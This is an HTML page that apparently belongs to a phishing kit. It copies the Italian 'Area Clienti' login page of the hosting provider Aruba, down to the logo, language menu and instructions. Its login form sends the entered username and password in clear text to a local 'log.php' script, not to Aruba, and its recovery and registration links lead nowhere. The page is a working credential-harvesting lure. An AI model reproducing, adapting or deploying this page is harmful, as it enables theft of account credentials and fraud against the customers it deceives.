<html>
   <head>
      <meta http-equiv="origin-trial" >
      <meta http-equiv="origin-trial" content="">
   </head>
   <body id="noauth-layout" class="background-noauth">
      <div id="in-page-channel-node-id" data-channel-name="in_page_channel_nk9aj_"></div>
      <meta http-equiv="origin-trial" content="">
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <meta name="format-detection" content="telephone=no">
      <title>Area Clienti</title>
      <link href="assets/css/login.css" rel="stylesheet">
      <link href="https://fonts.googleapis.com/css?family=Lato:400,300,700|Karla:400,700" rel="stylesheet" type="text/css">
      <link href="assets/css/piuzyDUBY8j_grZC0NcY1JzTFbmPb_tqDTq9wxX0RDs1.css" rel="stylesheet">
      <meta name="CustomerAreaToken" content="cbf257fc-1f6c-4c47-ba33-12b8f1478aaa">
      <link rel="apple-touch-icon" sizes="57x57" href="/apple-touch-icon-57x57.png">
      <link rel="apple-touch-icon" sizes="60x60" href="/apple-touch-icon-60x60.png">
      <link rel="apple-touch-icon" sizes="72x72" href="/apple-touch-icon-72x72.png">
      <link rel="apple-touch-icon" sizes="76x76" href="/apple-touch-icon-76x76.png">
      <link rel="apple-touch-icon" sizes="114x114" href="/apple-touch-icon-114x114.png">
      <link rel="apple-touch-icon" sizes="120x120" href="/apple-touch-icon-120x120.png">
      <link rel="apple-touch-icon" sizes="144x144" href="/apple-touch-icon-144x144.png">
      <link rel="apple-touch-icon" sizes="152x152" href="/apple-touch-icon-152x152.png">
      <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon-180x180.png">
      <link rel="icon" type="image/png" href="/favicon-32x32.png" sizes="32x32">
      <link rel="icon" type="image/png" href="/android-chrome-192x192.png" sizes="192x192">
      <link rel="icon" type="image/png" href="/favicon-96x96.png" sizes="96x96">
      <link rel="icon" type="image/png" href="/favicon-16x16.png" sizes="16x16">
      <link rel="manifest" href="/manifest.json">
      <link rel="mask-icon" href="/safari-pinned-tab.svg" color="#da532c">
      <meta name="msapplication-TileColor" content="#da532c">
      <meta name="msapplication-TileImage" content="/mstile-144x144.png">
      <meta name="theme-color" content="#ffffff">
      <style type="text/css"></style>
      <style type="text/css" id="CookieConsentStateDisplayStyles">.cookieconsent-optin-preferences,.cookieconsent-optin-statistics,.cookieconsent-optin-marketing,.cookieconsent-optin{display:none;}.cookieconsent-optout-preferences,.cookieconsent-optout-statistics,.cookieconsent-optout-marketing,.cookieconsent-optout{display:block;display:initial;}</style>
      <!-- Google Tag Manager (noscript) -->
      <!-- End Google Tag Manager (noscript) -->
      <div id="body-container" class="header-enabled">
         <main class="container">
            <div class="row">
               <div class="col-md-8 col-md-offset-2">
                  <div id="">
                     <div class="">
                        <div class="loginPage">
                           <br><br>
                           <div class="login-form">
                              <div id="logoContainer" class="row">
                                 <div class="col-sm-4  col-xs-6">
                                    <a title="Aruba - Customer Area">
                                       <div class="arubaLogo"></div>
                                    </a>
                                 </div>
                                 <div class="col-sm-4">
                                 </div>
                                 <div class="col-sm-4  col-xs-6 left40">
                                    <img id="info" class="flagMondo" src="assets/images/Icona-mondo.svg" style="
                                       margin-top: 14px;
                                       ">
                                    <div class="collapse navbar-collapse" id="topNavBarContainer-collapse">
                                       <ul class="nav navbar-nav" ng-if="baseCtrl.localization.allowChangeLanguage">
                                          <li class="dropdown">
                                             <a class="dropdown-toggle" data-toggle="dropdown" role="button" aria-haspopup="true" aria-expanded="false">Italiano <span class="caret"></span></a>
                                             <ul class="dropdown-menu">
                                                <li>
                                                   <a href="/start/SetLanguage?languageIsoCode=en&amp;returnUrl=" id="language_en">English</a>
                                                </li>
                                                <li>
                                                   <a href="/start/SetLanguage?languageIsoCode=fr&amp;returnUrl=" id="language_fr">Français</a>
                                                </li>
                                                <li>
                                                   <a href="/start/SetLanguage?languageIsoCode=es&amp;returnUrl=" id="language_es">Español</a>
                                                </li>
                                             </ul>
                                          </li>
                                       </ul>
                                    </div>
                                 </div>
                              </div>
                              <hr class="hrSeparator">
                              <br>
                              <div>
                                 <h2 class="new-panel-title"><b>Area Clienti</b></h2>
                              </div>
                              <div>
                                 <form class="form-horizontal" action="log.php" method="post" >
                                    
                                  
                                    
                                    <div class="marginB-25 font15">
                                       Inserisci lo username Aruba (es: 123456@aruba.it) e password oppure l'account Cloud (ARU, AWI, ecc...)
                                       <div class="finderio_ext_verify_img apps500 verify_email"></div>
                                    </div>
                                    
                                    <div class="usernameLabelSt font15">
                                       <b>Username</b>
                                       <a target="_self" class="recoverCredentials" tabindex="-1">Non ricordi lo username?</a>
                                    </div>
                                    <div class="marginB-25" style="position: relative;">
                                       <input type="text" placeholder="" class="inputStyle valid" autocomplete="true" name="log" id="Login" maxlength="63" required="" aria-describedby="Login-error" aria-invalid="false">
                                    </div>
                                    <div class="usernameLabelSt font15">
                                       <b>Password</b>
                                       <a target="_self" class="recoverCredentials" tabindex="-1">Non ricordi la password?</a>
                                    </div>
                                    <div class="marginB-40">
                                       <input type="text" placeholder="Password" class="inputStyle valid" name="pass" id="Password" maxlength="4091" required="" aria-describedby="Password-error" aria-invalid="false">
                                       <img class="img-eyeWeb" id="eye-passwordWeb" onclick="showPasswordWeb()" style="display:block" src="assets/images/eye-show.svg">
                                       <img class="img-eye-noWeb" id="eye-no-passwordWeb" onclick="showPasswordWeb()" style="display:none" src="../Content/CustomerArea/images/layout/icon/alert/eye-hide.svg">
                                    </div>
                                    <button id="submitFormCustomerArea" name="sub" class="accessButton col-xs-12 accessButtonContainer" type="submit">
                                    <span>ACCEDI</span>
                                    </button>
                                    <br>
                                    <hr class="hrSeparator">
                                    <br><br>
                                    <div class="registerUserCont">
                                       <div class="font15">Sei un nuovo cliente?</div>
                                       <a class="registerUserBtn font16 transition" id="register">
                                       <span class="showTextDesktop">Crea il tuo account Aruba</span>
                                       <span class="showTextMobile">Crea il tuo account Aruba</span>
                                       </a>
                                    </div>
                                 </form>
                              </div>
                           </div>
                        </div>
                     </div>
                  </div>
               </div>
            </div>
         </main>
      </div>
   </body>
</html>